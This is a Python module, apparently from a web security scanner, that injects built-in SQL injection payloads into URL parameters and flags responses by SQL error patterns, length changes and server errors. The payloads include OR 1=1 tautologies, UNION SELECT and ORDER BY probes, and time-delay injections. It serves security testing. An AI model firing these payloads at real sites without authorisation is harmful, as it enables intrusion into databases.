"""
modules/sqli.py
---------------
SQL Injection detection module.

Detects error-based and boolean-based blind SQLi by:
- Injecting payloads into URL parameters and POST body
- Comparing responses against a clean baseline
- Scanning for known SQL error messages in responses
"""

import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseModule
from utils.helpers import extract_params, inject_param


# Known SQL error patterns (case-insensitive)
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"supplied argument is not a valid mysql",
    r"invalid query",
    r"sql syntax.*?mysql",
    r"warning.*?mysql_",
    r"mysqli_",
    r"ORA-[0-9]{5}",
    r"pg_query\(\)",
    r"sqlite3\.operationalerror",
    r"microsoft ole db provider for odbc drivers",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"odbc microsoft access driver",
    r"syntax error.*?in query expression",
    r"data type mismatch in criteria expression",
    r"error converting data type",
    r"supplied argument is not a valid",
    r"\[microsoft\]\[odbc sql server driver\]",
]

# Inline payloads — loaded if no external wordlist provided
DEFAULT_SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",",
    '"',
    '""',
    "/",
    "//",
    "\\",
    "\\\\",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    ") OR '1'='1",
    ") OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
]


class SQLiModule(BaseModule):
    """
    SQL Injection exploit module.

    Strategies:
    - Error-based: inject payload, scan response for SQL error strings
    - Differential: compare injected response length/content vs baseline
    - Boolean: compare true vs false condition responses
    """

    def load_payloads(self) -> List[str]:
        """Load SQLi payloads from external wordlist or defaults."""
        if self.config.wordlist:
            return self._load_external_wordlist(self.config.wordlist)
        return DEFAULT_SQLI_PAYLOADS

    def execute(self) -> List[Dict[str, Any]]:
        """
        Execute the SQLi scan against all URL parameters.

        Returns:
            List of result dicts for each tested payload.
        """
        payloads = self.load_payloads()
        self.logger.info(f"[+] {len(payloads)} SQLi payloads loaded")

        params = extract_params(self.config.url, self.config.param)
        if not params:
            self.logger.warning("[!] No injectable parameters found in URL")
            self.logger.warning("    Try adding ?id=1 or specifying --param manually")
            return []

        self.logger.info(f"[+] Parameters detected: {', '.join(params)}")

        # Take a baseline response per parameter
        baselines = self._take_baselines(params)

        # Build a flat list of (payload, param) jobs
        jobs = [(payload, param) for param in params for payload in payloads]
        self.logger.info(f"[*] Testing {len(jobs)} payload/param combinations...")

        results = []
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(self._test_payload, payload, param, baselines.get(param)): (payload, param)
                for payload, param in jobs
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] Param='{result['param']}' "
                            f"Payload='{result['payload'][:40]}' "
                            f"| {result['evidence']}"
                        )

        return results

    def _take_baselines(self, params: List[str]) -> Dict[str, Any]:
        """Get baseline responses (no injection) for each parameter."""
        baselines = {}
        for param in params:
            clean_url = inject_param(self.config.url, param, "1")
            resp = self.http.get(clean_url)
            if resp:
                baselines[param] = {
                    "status": resp.status_code,
                    "length": len(resp.content),
                    "body": resp.text,
                }
        return baselines

    def _test_payload(
        self, payload: str, param: str, baseline: Dict
    ) -> Dict[str, Any]:
        """
        Inject a single payload into a single parameter and analyze the result.
        Delay is applied here so each worker thread respects --delay between its own requests.
        """
        if self.config.delay:
            time.sleep(self.config.delay)

        injected_url = inject_param(self.config.url, param, payload)
        response = self.http.get(injected_url)

        if response is None:
            return {
                "payload": payload,
                "param": param,
                "vulnerable": False,
                "evidence": "No response",
                "url": injected_url,
            }

        return self.analyze_response(response, payload, param, baseline)

    def analyze_response(
        self, response, payload: str, param: str, baseline: Dict = None, **kwargs
    ) -> Dict[str, Any]:
        """
        Analyze response for SQLi indicators.

        Checks:
        1. SQL error strings in body
        2. Large response length delta vs baseline
        3. Status code anomalies
        """
        result = {
            "payload": payload,
            "param": param,
            "vulnerable": False,
            "evidence": "",
            "status_code": response.status_code,
            "response_length": len(response.content),
            "url": response.url if hasattr(response, "url") else self.config.url,
        }

        body = response.text.lower()

        # Check 1: SQL error patterns
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                result["vulnerable"] = True
                result["evidence"] = f"SQL error pattern matched: '{pattern}'"
                return result

        # Check 2: Response length differential (>20% change)
        if baseline:
            baseline_len = baseline.get("length", 0)
            if baseline_len > 0:
                delta = abs(len(response.content) - baseline_len) / baseline_len
                if delta > 0.20:
                    result["vulnerable"] = True
                    result["evidence"] = (
                        f"Response length delta {delta:.0%} "
                        f"(baseline={baseline_len}, injected={len(response.content)})"
                    )
                    return result

        # Check 3: Unexpected 500 (server error on injection)
        if response.status_code == 500 and (baseline and baseline.get("status") != 500):
            result["vulnerable"] = True
            result["evidence"] = "HTTP 500 on injection (possible unhandled SQL exception)"

        return result
